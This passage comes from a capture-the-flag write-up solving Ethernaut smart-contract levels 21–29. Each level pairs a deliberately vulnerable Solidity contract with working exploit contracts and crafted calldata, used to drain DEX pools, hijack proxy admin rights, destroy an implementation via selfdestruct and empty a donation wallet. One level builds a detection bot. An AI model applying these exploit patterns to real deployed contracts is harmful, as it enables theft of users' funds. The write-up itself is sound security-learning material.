1. Get the item from the shop for less than the price asked.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

</details>

### Exploit

The `Shop` contract relies on `price` from an external contract to determine what price the item will sell for. It attempts to prevent exploits by the fact that `price` is a `view` function. However there is still a way to exploit the use of an interface.

I deployed the following `Hack` contract that has a `price` function. I returns different values based on a condition even while being a `view` function.

```js
contract Hack {
    Shop target;

    constructor(address _targetAddress){
        target = Shop(_targetAddress);
    }

    function hack() external {
        target.buy();
    }

    function price() external view returns(uint) {
        if(target.isSold() == false){
            return 100;
        } else {
            return 1;
        }
    }
}
```

Calling the `hack` function to completes the level. This works because of the way `buy` is written. It first checks `_buyer.price() >= price && !isSold`. This calls `price` once and `isSold` is `false`, therefore it returns 100. Once the condition passes, `isSold` is set to true. I used this value as a condition to return a lower price.

## <a id="22"></a>Level 22 - Dex

### Objective

1. Drain either all the tokens from token1 or token2 from the contract.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

</details>

### Exploit

The Dex uses the `getSwapPrice` function to determine the _conversion rate_ from one token to the other.

The function relies on the total amount of token currently in the contract to derive the rates. This is bad since the amount of token is only 100 and we already own 10. That means we own 9% of the total tokens for each token. That's a lot of power.

By swapping all 10 of your `token1` to `token2`, you end up with 20 `token2`. Then By swapping all of your `token2` into `token1` you end up with 24 `token1`! We have manipulated the dex in our favor to get more token than we have started with.

By doing this back and forth a few times, I ended up with 110 `token2`s.

## <a id="23"></a>Level 23 - Dex2

### Objective

1. Drain all balances of token1 and token2 from the DexTwo contract to succeed this level.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

</details>

### Exploit

The Dex2 contract is very similar to the Dex contract of the previous level. That being said, there is one crucial difference in the `swap` function. There is **no validation** that the tokens swapped are token1 and token2. Dex had a `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");` which did just that.

To exploit this, I deployed my own ERC20 token which is a modified version of `SwappableTokenTwo`.

```js
contract SwappableTokenHack is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(dexInstance, 1);
        _mint(msg.sender, 109);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

At deployment, it gives 1 hack token to Dex2 and 109 to myself. Using the `swap` I can now swap 1 hack token for 100 `token1`s. I followed this by swapping 2 hackTokens for 100 `token2`s. This completes the level.

## <a id="24"></a>Level 24 - PuzzleWallet

### Objective

1. Become the admin of the proxy.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

</details>

### Exploit

This is another case of a Proxy with conflicting storage slots. `pendingAdmin` and `owner` share a slot and `admin` and `maxBalance` share a slot.

```js
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;
    // Rest of the contract...
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    // Rest of the contract...
}
```

The goal is to set `admin` to our EOA address. We can do this by changing `maxBalance` to the uint value equating our EOA. To accomplish this we would need to call `setMaxBalance`. The two things preventing is us are:

1. `onlyWhitelisted` requires us to be whitelisted.
2. The following condition needs to be true `address(this).balance == 0`. This means that the balance of the wallet needs to be empty.

Let's tackle the first point. We call `proposeNewAdmin` with our EOA as argument. This makes our EOA the new owner of `PuzzleWallet`.

We now have the proper access to make ourselves whitelisted by calling `addToWhitelist` with our EOA as argument. This satisfies the first condition.

Next we want to empty the wallet of funds. The function that withdraws funds is `execute`. The following condition needs to be true `balances[msg.sender] >= value`. This is problematic since withdrawing all funds requires our balance to be at least as big as the contract's whole balance. This would be impossible if not for a bug in `multicall`.

`multicall` has a built-in protection on calling `deposit` more than once using `multicall`. That being said, we can provide `multicall` with an argument that consists of `deposit` at the 0th index and a `multicall` that itself has an argument of `deposit` in the 1rst index. This effectively calls `deposit` in two "parallel" `multicall` instead of the same.

Doing this made our balance equal to 0.002 while having only deposited 0.001. This now enables us to call `execute` to withdraw 0.002 ether which is all the wallet's funds.

All that is left is to call `setMaxBalance` with our EOA converted into uint256. Congrats, the level is complete!

## <a id="25"></a>Level 25 - Motorbike

### Objective(s)

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

</details>

### Exploit

This type of proxy has the "logic" contract address in a specific storage slot. It is a constant named `_IMPLEMENTATION_SLOT`. We can read its value with.

```js
await web3.eth.getStorageAt(
    contract.address,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
);
```

The resulting address is the address of the "logic" contract. It turns out that `initialize`, which acts as some sort of `constructor` has not yet been called. Calling it makes you become the `upgrader`.

We can now call write and deploy a simple `Hack` contract that can call `selfdestruct`.

```js
contract Hack {
    function Boom() external {
        selfdestruct(address(0));
    }
}
```

From there, all that is left is to call `upgradeToAndCall` as the `upgrader` and provide the hack contract's address and the `Boom` function selector as data argument. You can find that one with `bytes4(keccak256("Boom()"))`. Doing that replaces the previous 'logic' contract with our Hack contract and calls `selfdestruct`. The level is now complete.

## <a id="26"></a>Level 26 - DoubleEntryPoint

### Objective

1. Implement a detection bot contract to prevent attacks or bug exploits.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  }
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

</details>

### Exploit

`CryptoVault` has a `sweepToken` functionality which does not work on the underlying token which is the `DoubleEntryPoint` token due to the following require condition `token != underlying`.

However, there is an implementation bug either in `CryptoVault` or `LegacyToken`. Calling `sweepToken` for `LegacyToken` calls the `transfer` function of `LegacyToken`. That implementation of `transfer` in turn calls `delegateTransfer` from `DoubleEntryPoint`.

This effectively means that all `DoubleEntryPointTokens` can be drained by calling `LegacyToken.transfer`. Since `DoubleEntryPoint.delegateTransfer` has the modifier `fortaNotify`, we can create a detection bot to **prevent this attack**.

Since we are dealing with a function calling another function and so on, I was too lazy to figure out the layout of the msg.data of the attack function call. Using Remix, I simply created a dummy contract and recreated the same function call we are interested in which is `DoubleEntryPoint.delegateTransfer` with the correct arguments.

```js
contract Test {
    function delegateTransfer(address to, uint256 value, address origSender) public returns (bool) {
        //_transfer(origSender, to, value);
        return true;
    }
}
```

Inspecting on a block explorer I found the following `msg.data`.

```
0: 0x9cd1a121
1: 000000000000000000000000cc5065fa8f55f6929e1fa52e1ee6911f12c54a7f
2: 0000000000000000000000000000000000000000000000056bc75e2d63100000
3: 0000000000000000000000002f06c3d34361bcc5cbdfd3062345b00a9c29cc5b
```

In slot 3 we have the `origSender` argument. Let's _raise an alert_ when its equal to the address of `CryptoVault`. This way, the transaction will `revert` and the attack will be prevented.

I wrote and deployed the following `DetectionBot` contract.

```js
contract YouShallNotPass is IDetectionBot {
    address vaultAddress;
    IForta target;

    constructor(address _valutAddress, address _targetAddress) {
        vaultAddress = _valutAddress;
        target = IForta(_targetAddress);
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        // Use abi.decode to decode the parameters
        address origSender;
        (,,  origSender) = abi.decode(msgData[4:], (address, uint256, address));

        if (origSender == vaultAddress) {
            target.raiseAlert(user);
        }
    }
}
```

I then called `IForta.setDetectionBot` to register it. This patches the security vulnerability detailed above. The level is complete!

## <a id="27"></a>Level 27 - Good Samaritan

### Objective

1.  Drain the funds from the Good Samaritan's wallet.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

</details>

### Exploit

Looking at `GoodSamaritan` we can see that `requestDonation` sends 10 coins at a time to the address requesting. If the `GoodSamaritan` has less than 10 coins, the **complete balance will be transferred instead**. This is exactly what we want to happen.

To determine if that condition is true, the function uses a `try catch`. The `catch` looks at the error and compares it to the "NotEnoughBalance" error. We can exploit this by writing a hack contract that will **mimic** this error in specific conditions.

The Hack contract needs to inherit from `INotifyable`. This way Hack will be notified when coins are transfered and how much. If we can throw the `NotEnoughBalance` error when 10 coins are transfered, the complete balance of the `GoodSamaritan` will be transfered.

```js
contract Hack is INotifyable{
    GoodSamaritan target;
    error NotEnoughBalance();

    constructor(address _targetAddress) {
        target = GoodSamaritan(_targetAddress);
    }

    function attack() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10){
            revert NotEnoughBalance();
        }
    }
}
```

By calling the `attack` function from our Hack contract, the complete balance of `GoodSamaritan` will be transfered to us.

## <a id="28"></a>Level 28 - Gatekeeper Three

### Objective

1. Get past the gates and become an entrant.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }

  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }

  function trickInit() public {
    trick = address(this);
  }

  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}
```

</details>

### Solution

To pass the first gate, we need to deploy a `Hack` contract and call the `construct0r` function from it. This will make the hack contract the new owner. This is the requirement to pass the first gate.

To make it pass the second gate, `allowEntrance` needs to be true. To make this happen, our hack contract needs to call `createTrick`. The password of the created instance of `SimpleTrick` is set to `block.timestamp` in the constructor. Let's exploit this by calling `getAllowance(block.timestamp)` in the same transaction. Therefore the password value will be the current `block.timestamp`.

To get past gateThree, let's send a minimum of `1000000000000001 ether` to the `GatekeeperThree` contract. From there all we need is for the hack contract to revert when receiving any amount.

Here is the hack contract I used.

```js
contract Hack {
  GatekeeperThree target;

  constructor(address payable _targetAddress) {
    target = GatekeeperThree(_targetAddress);
  }

  function hack() external {
    // gateone
    target.construct0r(); // address(this) becomes

    // gateTwo
    target.createTrick(); // sets the PW as block.timestamp
    target.getAllowance(block.timestamp); // allowEntrance = True

    target.enter();
  }

  // gateThree
  receive() external payable {
    revert();
  }
}
```

## <a id="29"></a>Level 29 - Switch

### Objective

1. Flip the switch to pass the level.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}
```

</details>

### Exploit

Calling `turnSwitchOn` directly is impossible due to the `onlyThis` modifier. We will need to call `flipSwitch` which calls its own contract.

Let's carefully construct a calldata such that `onlyOff` is satisfied and such that `flipSwitch` calls `turnSwitchOn`. Let's simply call `flipSwitch` with `offSelector` as argument. The transaction is successful but no state changes as expected.

Looking at the transaction on Etherscan we see that the calldata is the following.

```
Function: flipSwitch(bytes _data) ***

MethodID: 0x30c13ade
[0]:  0000000000000000000000000000000000000000000000000000000000000020
[1]:  0000000000000000000000000000000000000000000000000000000000000004
[2]:  20606e1500000000000000000000000000000000000000000000000000000000
```

The value `20606e15` is `offSelector`. It needs to stay exactly there due to the assembly section looking at the 68th byte.

Since `bytes` is dynamic, it is encoded following special rules. The 20 in the first 32 bytes word represents how many bytes you need to skip forward for the actual first value of `bytes`. (20 is 32 in hex)

By skipping past the 3rd 32 bytes word we can now put the selector value for `turnSwitchOn`. This value can be found with the following.

```js
bytes4(keccak256("turnSwitchOn()"));
```

Therefore changing the 20 bytes to 60 bytes in the first word. Then moving the second word as the fourth word instead. And finally adding a fifth word with the `turnSwitchOn` value, we get the following.

```
MethodID: 0x30c13ade
[0]: 0000000000000000000000000000000000000000000000000000000000000020
[1]: 0000000000000000000000000000000000000000000000000000000000000004
[2]: 20606e1500000000000000000000000000000000000000000000000000000000
[3]: 0000000000000000000000000000000000000000000000000000000000000004
[4]: 76227e1200000000000000000000000000000000000000000000000000000000
```

## <a id="readings"></a>Essential readings

Here is a list of links that helped me solve these levels.

### Environements and tools

-   The package.json of the openzeppelin contracts used in Ethernaut. Two different versions are used: <a target="_blank" rel="noopener noreferrer" href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/package.json">https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/package.json</a>

-   The documentation of web3.js the ethereum javaScript framework embedded in the console on Ethernaut: <a target="_blank" rel="noopener noreferrer" href="https://web3js.readthedocs.io/en/v1.10.0/">https://web3js.readthedocs.io/en/v1.10.0/](https://web3js.readthedocs.io/en/v1.10.0/</a>

-   A browser based IDE for Solidity development: <a target="_blank" rel="noopener noreferrer" href="https://remix.ethereum.org/">https://remix.ethereum.org/</a>

-   A CLI based Solidity development framework written in Rush: <a target="_blank" rel="noopener noreferrer" href="https://book.getfoundry.sh/">https://book.getfoundry.sh/</a>

-   A CLI based Solidity development framework written in javaScript: <a target="_blank" rel="noopener noreferrer" href="https://hardhat.org/">https://hardhat.org/</a>

-   An interactive playground for all things Solidity Assembly: <a target="_blank" rel="noopener noreferrer" href="https://www.evm.codes/playground">https://www.evm.codes/playground</a>

-   A block explorer for the Sepolia test network: <a target="_blank" rel="noopener noreferrer" href="https://sepolia.etherscan.io/">https://sepolia.etherscan.io/</a>

### solidity basics

-   Documentation of the global variables and transaction properties: <a target="_blank" rel="noopener noreferrer" href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties">https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties</a>

-   An example of contructor in Solidity: <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/constructor/">https://solidity-by-example.org/constructor/</a>

-   An example calling a contract with another contract: <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/calling-contract/">https://solidity-by-example.org/calling-contract/</a>

-   An example of arithmetic overflows and underflows in Solidity: <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/hacks/overflow/">https://solidity-by-example.org/hacks/overflow/</a>

-   An example of fallback functions: <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/fallback/">https://solidity-by-example.org/fallback/</a>

-   An example of the selfdestruct function in Solidity: <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/hacks/self-destruct/">https://solidity-by-example.org/hacks/self-destruct/</a>

-   An example of interfaces in Solidity: <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/interface/">https://solidity-by-example.org/interface/</a>

-   An example of function modifiers : <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/function-modifier/">https://solidity-by-example.org/function-modifier/</a>

-   ERC20 by openZeppelin: <a target="_blank" rel="noopener noreferrer" href="https://docs.openzeppelin.com/contracts/4.x/erc20">https://docs.openzeppelin.com/contracts/4.x/erc20</a>

### advanced solidity concepts

-   An example of a delegatecall in Solidity: <a target="_blank" rel="noopener noreferrer" href="https://solidity-by-example.org/delegatecall/">https://solidity-by-example.org/delegatecall/</a>

-   Documentation of the checks-effects pattern in Solidity: <a target="_blank" rel="noopener noreferrer" href="https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern">https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern</a>

-   Documentation on the layout of contract storage in Solidity: <a target="_blank" rel="noopener noreferrer" href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html">https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html</a>

-   The list of EVM Opcodes <a target="\_blank" rel="noopener noreferrer" href="https://www.evm.codes/?fork=shanghai"> https://www.evm.codes/?fork=shanghai</a>

